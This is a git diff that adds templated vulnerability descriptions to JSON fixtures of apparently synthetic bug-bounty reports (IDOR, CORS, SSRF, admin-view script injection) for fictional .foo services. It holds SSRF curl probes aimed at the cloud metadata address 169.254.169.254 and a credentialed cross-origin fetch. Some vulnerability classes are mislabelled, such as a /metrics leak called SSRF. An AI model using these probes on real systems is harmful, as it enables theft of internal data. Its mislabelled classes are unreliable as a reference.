+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://billing.rheinspitze-energie.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21872,7 +22040,8 @@
           "offset": "6d 19h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://billing.rheinspitze-energie.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
diff --git a/fixtures/reports/schneeconnect_mobility_reports.json b/fixtures/reports/schneeconnect_mobility_reports.json
index ac948ad..6276770 100644
--- a/fixtures/reports/schneeconnect_mobility_reports.json
+++ b/fixtures/reports/schneeconnect_mobility_reports.json
@@ -78,7 +78,8 @@
           "offset": "8d 8h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API sends Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, enabling exfiltration of authenticated data via victim browser.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.schneeconnect-mobility.foo`\n- Preconditions: authenticated user: victim user; app version: API 2.1\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch('/api/me',{credentials:'include'})\n- Observe JSON with user profile in attacker origin\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -197,7 +198,8 @@
           "offset": "3d 2h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://app.schneeconnect-mobility.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -344,7 +346,8 @@
           "offset": "5d 20h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://app.schneeconnect-mobility.foo/import`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -488,7 +491,8 @@
           "offset": "7d 14h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.schneeconnect-mobility.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -592,7 +596,8 @@
           "offset": "10h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.schneeconnect-mobility.foo/profile`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -739,7 +744,8 @@
           "offset": "9d 11h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://app.schneeconnect-mobility.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -847,7 +853,8 @@
           "offset": "2d 2h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.schneeconnect-mobility.foo/fetch`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1014,7 +1021,8 @@
           "offset": "5d 17h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://app.schneeconnect-mobility.foo/api/me`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1127,7 +1135,8 @@
           "offset": "1d 1h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.schneeconnect-mobility.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1197,7 +1206,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://app.schneeconnect-mobility.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1310,7 +1320,8 @@
           "offset": "2d 6h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.schneeconnect-mobility.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1436,7 +1447,8 @@
           "offset": "2d 20h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.schneeconnect-mobility.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1575,7 +1587,8 @@
           "offset": "3d 8h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.schneeconnect-mobility.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1747,7 +1760,8 @@
           "offset": "6d 12h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://app.schneeconnect-mobility.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1875,7 +1889,8 @@
           "offset": "1d 15h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.schneeconnect-mobility.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1994,7 +2009,8 @@
           "offset": "2d 9h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://app.schneeconnect-mobility.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -2162,7 +2178,8 @@
           "offset": "5d 3h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://app.schneeconnect-mobility.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2312,7 +2329,8 @@
           "offset": "9d 12h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.schneeconnect-mobility.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2438,7 +2456,8 @@
           "offset": "5d 10h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.schneeconnect-mobility.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2533,7 +2552,8 @@
           "offset": "4d 7h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.schneeconnect-mobility.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2681,7 +2701,8 @@
           "offset": "8d",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://app.schneeconnect-mobility.foo/api/me`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2836,7 +2857,8 @@
           "offset": "2d 7h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://app.schneeconnect-mobility.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2967,7 +2989,8 @@
           "offset": "7d 6h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.schneeconnect-mobility.foo/api/v2/documents/`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3114,7 +3137,8 @@
           "offset": "3d 9h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.schneeconnect-mobility.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3242,7 +3266,8 @@
           "offset": "10h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.schneeconnect-mobility.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3337,7 +3362,8 @@
           "offset": "13h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.schneeconnect-mobility.foo/import`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3493,7 +3519,8 @@
           "offset": "3d",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://app.schneeconnect-mobility.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3634,7 +3661,8 @@
           "offset": "8d 6h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.schneeconnect-mobility.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3766,7 +3794,8 @@
           "offset": "4d 1h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
